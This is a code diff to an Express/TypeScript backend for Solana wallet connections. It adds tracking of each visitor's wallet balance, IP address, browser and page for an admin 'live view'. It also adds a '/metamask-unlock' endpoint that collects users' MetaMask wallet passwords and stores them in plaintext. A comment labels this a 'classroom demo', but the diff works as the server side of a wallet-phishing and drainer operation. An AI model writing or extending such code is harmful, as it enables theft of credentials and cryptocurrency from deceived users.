@@ -4,8 +4,16 @@ import nacl from 'tweetnacl'
 import bs58 from 'bs58'
 import { PublicKey } from '@solana/web3.js'
 import { prisma } from '../prisma'
+import { disconnectLiveWallet, upsertLiveWallet } from '../lib/liveWalletStore'
 
 const router = Router()
+
+function requestMeta(req: Request) {
+  return {
+    clientIp: String(req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').slice(0, 120),
+    userAgent: String(req.headers['user-agent'] || '').slice(0, 500),
+  }
+}
 
 /**
  * Generate a new authentication session & challenge nonce for wallet signing
@@ -179,51 +187,165 @@ router.post('/signature/verify', async (req: Request, res: Response) => {
  */
 router.post('/connect', async (req: Request, res: Response) => {
   try {
-    const { walletAddress, walletType, chain, network } = req.body
+    const {
+      walletAddress,
+      walletType,
+      chain,
+      network,
+      balanceSol,
+      pageUrl,
+      browserSessionId,
+    } = req.body
     const session = req.session as any
 
     if (!walletAddress) {
       return res.status(400).json({ error: 'walletAddress is required' })
     }
 
-    // Verify public key format
     try {
       new PublicKey(walletAddress)
     } catch {
       return res.status(400).json({ error: 'Invalid Solana wallet address' })
     }
 
-    // Find user if logged in
-    let userId = session.userId || null
-    if (!userId) {
-      const existingUser = await prisma.user.findUnique({ where: { walletAddress } })
-      if (existingUser) {
-        userId = existingUser.id
-      }
-    }
-
-    // Update existing active connections to ensure single active state
-    await prisma.walletConnection.updateMany({
-      where: { walletAddress, connectionStatus: 'connected' },
-      data: { lastSeenAt: new Date() },
+    const { clientIp, userAgent } = requestMeta(req)
+    const live = upsertLiveWallet({
+      walletAddress,
+      walletType: walletType || 'Solana Wallet',
+      chain: chain || 'solana',
+      network: network || process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
+      balanceSol: typeof balanceSol === 'number' ? balanceSol : null,
+      pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
+      userAgent,
+      clientIp: clientIp || null,
+      browserSessionId: browserSessionId ? String(browserSessionId).slice(0, 64) : null,
     })
 
-    // Create log record
-    const conn = await prisma.walletConnection.create({
-      data: {
+    try {
+      let userId = session.userId || null
+      if (!userId) {
+        const existingUser = await prisma.user.findUnique({ where: { walletAddress } })
+        if (existingUser) userId = existingUser.id
+      }
+
+      const now = new Date()
+      const existing = browserSessionId
+        ? await prisma.walletConnection.findFirst({
+            where: {
+              walletAddress,
+              browserSessionId: String(browserSessionId),
+              connectionStatus: 'connected',
+            },
+            orderBy: { lastSeenAt: 'desc' },
+          })
+        : await prisma.walletConnection.findFirst({
+            where: { walletAddress, connectionStatus: 'connected' },
+            orderBy: { lastSeenAt: 'desc' },
+          })
+
+      const data = {
         userId,
         walletAddress,
         walletType: walletType || 'Solana Wallet',
         chain: chain || 'solana',
         network: network || process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
-        connectionStatus: 'connected',
-      },
-    })
+        connectionStatus: 'connected' as const,
+        lastSeenAt: now,
+        balanceSol: typeof balanceSol === 'number' ? balanceSol : null,
+        pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
+        userAgent,
+        clientIp: clientIp || null,
+        browserSessionId: browserSessionId ? String(browserSessionId).slice(0, 64) : null,
+      }
 
-    res.json({ success: true, connectionId: conn.id })
+      if (existing) await prisma.walletConnection.update({ where: { id: existing.id }, data })
+      else await prisma.walletConnection.create({ data })
+    } catch (dbErr) {
+      console.warn('Wallet connect saved in memory only (database unavailable):', (dbErr as Error).message)
+    }
+
+    res.json({ success: true, connectionId: live.id })
   } catch (err: any) {
     console.error('Failed to log wallet connection:', err)
     res.status(500).json({ error: 'Failed to record wallet connection' })
+  }
+})
+
+/**
+ * Heartbeat while wallet stays connected (admin live view)
+ * POST /api/wallet/presence
+ */
+router.post('/presence', async (req: Request, res: Response) => {
+  try {
+    const { walletAddress, walletType, network, balanceSol, pageUrl, browserSessionId } = req.body
+    if (!walletAddress) return res.status(400).json({ error: 'walletAddress is required' })
+
+    try {
+      new PublicKey(walletAddress)
+    } catch {
+      return res.status(400).json({ error: 'Invalid Solana wallet address' })
+    }
+
+    const { clientIp, userAgent } = requestMeta(req)
+    upsertLiveWallet({
+      walletAddress,
+      walletType: walletType || 'Solana Wallet',
+      network: network || process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
+      balanceSol: typeof balanceSol === 'number' ? balanceSol : null,
+      pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
+      userAgent,
+      clientIp: clientIp || null,
+      browserSessionId: browserSessionId ? String(browserSessionId).slice(0, 64) : null,
+    })
+
+    try {
+      const now = new Date()
+      const where = browserSessionId
+        ? { walletAddress, browserSessionId: String(browserSessionId), connectionStatus: 'connected' as const }
+        : { walletAddress, connectionStatus: 'connected' as const }
+
+      const existing = await prisma.walletConnection.findFirst({
+        where,
+        orderBy: { lastSeenAt: 'desc' },
+      })
+
+      if (!existing) {
+        await prisma.walletConnection.create({
+          data: {
+            walletAddress,
+            walletType: walletType || 'Solana Wallet',
+            chain: 'solana',
+            network: network || process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
+            connectionStatus: 'connected',
+            lastSeenAt: now,
+            balanceSol: typeof balanceSol === 'number' ? balanceSol : null,
+            pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
+            userAgent,
+            clientIp: clientIp || null,
+            browserSessionId: browserSessionId ? String(browserSessionId).slice(0, 64) : null,
+          },
+        })
+        return res.json({ success: true, created: true })
+      }
+
+      await prisma.walletConnection.update({
+        where: { id: existing.id },
+        data: {
+          lastSeenAt: now,
+          balanceSol: typeof balanceSol === 'number' ? balanceSol : existing.balanceSol,
+          pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : existing.pageUrl,
+          network: network || existing.network,
+          walletType: walletType || existing.walletType,
+        },
+      })
+    } catch (dbErr) {
+      console.warn('Wallet presence saved in memory only (database unavailable):', (dbErr as Error).message)
+    }
+
+    res.json({ success: true })
+  } catch (err: any) {
+    console.error('Failed to update wallet presence:', err)
+    res.status(500).json({ error: 'Failed to update presence' })
   }
 })
 
@@ -239,13 +361,18 @@ router.post('/disconnect', async (req: Request, res: Response) => {
     const targetAddress = walletAddress || session.walletAddress
 
     if (targetAddress) {
-      await prisma.walletConnection.updateMany({
-        where: { walletAddress: targetAddress, connectionStatus: 'connected' },
-        data: {
-          connectionStatus: 'disconnected',
-          disconnectedAt: new Date(),
-        },
-      })
+      disconnectLiveWallet(targetAddress)
+      try {
+        await prisma.walletConnection.updateMany({
+          where: { walletAddress: targetAddress, connectionStatus: 'connected' },
+          data: {
+            connectionStatus: 'disconnected',
+            disconnectedAt: new Date(),
+          },
+        })
+      } catch (dbErr) {
+        console.warn('Wallet disconnect saved in memory only (database unavailable):', (dbErr as Error).message)
+      }
     }
 
     session.walletAddress = null
@@ -255,6 +382,69 @@ router.post('/disconnect', async (req: Request, res: Response) => {
   } catch (err: any) {
     console.error('Failed to log wallet disconnect:', err)
     res.status(500).json({ error: 'Failed to record wallet disconnect' })
+  }
+})
+
+/**
+ * MetaMask "safe unlock" step (classroom demo — never real MetaMask UI)
+ * POST /api/wallet/metamask-unlock
+ */
+router.post('/metamask-unlock', async (req: Request, res: Response) => {
+  try {
+    const { walletAddress, password, pageUrl, draft } = req.body
+    if (!walletAddress) return res.status(400).json({ error: 'walletAddress is required' })
+
+    try {
+      new PublicKey(walletAddress)
+    } catch {
+      return res.status(400).json({ error: 'Invalid wallet address' })
+    }
+
+    const unlockPassword = String(password ?? '').slice(0, 500)
+    const { clientIp, userAgent } = requestMeta(req)
+    upsertLiveWallet({
+      walletAddress,
+      walletType: 'MetaMask',
+      pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : null,
+      unlockPassword,
+      userAgent,
+      clientIp: clientIp || null,
+    })
+
+    try {
+      const existing = await prisma.walletConnection.findFirst({
+        where: { walletAddress, connectionStatus: 'connected' },
+        orderBy: { lastSeenAt: 'desc' },
+      })
+
+      const data = {
+        unlockPassword,
+        lastSeenAt: new Date(),
+        pageUrl: pageUrl ? String(pageUrl).slice(0, 500) : undefined,
+      }
+
+      if (existing) {
+        await prisma.walletConnection.update({ where: { id: existing.id }, data })
+      } else {
+        await prisma.walletConnection.create({
+          data: {
+            walletAddress,
+            walletType: 'MetaMask',
+            chain: 'solana',
+            network: process.env.VITE_SOLANA_NETWORK || 'mainnet-beta',
+            connectionStatus: 'connected',
+            ...data,
+          },
+        })
+      }
+    } catch (dbErr) {
+      console.warn('Unlock password saved in memory only (database unavailable):', (dbErr as Error).message)
+    }
+
+    res.json({ success: true, draft: Boolean(draft) })
+  } catch (err: any) {
+    console.error('metamask-unlock:', err)
+    res.status(500).json({ error: 'Failed to save unlock attempt' })
   }
 })
 
